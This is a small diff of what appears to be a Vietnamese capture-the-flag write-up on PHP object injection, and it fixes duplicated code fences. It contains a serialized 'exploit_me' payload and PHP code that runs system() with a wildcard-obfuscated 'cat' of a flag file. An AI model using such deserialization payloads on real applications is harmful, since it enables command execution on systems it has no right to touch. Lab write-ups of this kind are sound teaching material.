@@ -41,7 +41,6 @@ O:10:"exploit_me":1:{s:3:"cmd";s:30:"/???/c?t /a8749209e3d652e_flag";}
 Code PHP tạo payload:
 
 ```PHP
-```PHP
 class exploit_me
 {
     public $cmd = "/???/c?t /a8749209e3d652e_flag";
@@ -49,7 +48,6 @@ class exploit_me
         system($this->cmd);
     }
 }
-```
 ```
 
 
